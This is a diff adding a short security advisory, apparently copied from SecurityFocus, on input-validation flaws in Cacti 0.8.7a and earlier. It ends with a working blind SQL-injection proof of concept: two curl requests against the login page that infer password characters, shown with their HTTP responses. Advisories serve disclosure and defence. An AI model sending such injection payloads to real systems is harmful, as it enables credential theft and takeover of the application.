@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/27749/info
+     
+Cacti is prone to multiple unspecified input-validation vulnerabilities, including:
+     
+- Multiple cross-site scripting vulnerabilities
+- Multiple SQL-injection vulnerabilities
+- An HTTP response-splitting vulnerability.
+     
+Attackers may exploit these vulnerabilities to influence or misrepresent how web content is served, cached, or interpreted, to compromise the application, to access or modify data, to exploit vulnerabilities in the underlying database, or to execute arbitrary script code in the browser of an unsuspecting user.
+     
+These issues affect Cacti 0.8.7a and prior versions. 
+
+$ curl -kis "http://www.example.com/cacti-0.8.7a/index.php/sql.php" -d \
+"login_username=foo'+or+ascii(substring(password,1,1))>56#&action=login" \
+| head -n1
+HTTP/1.1 200 OK
+$ curl -kis "http://www.example.com/cacti-0.8.7a/index.php/sql.php" -d \
+"login_username=foo'+or+ascii(substring(password,1,1))<56#&action=login" \
+| head -n1
+HTTP/1.1 302 Found
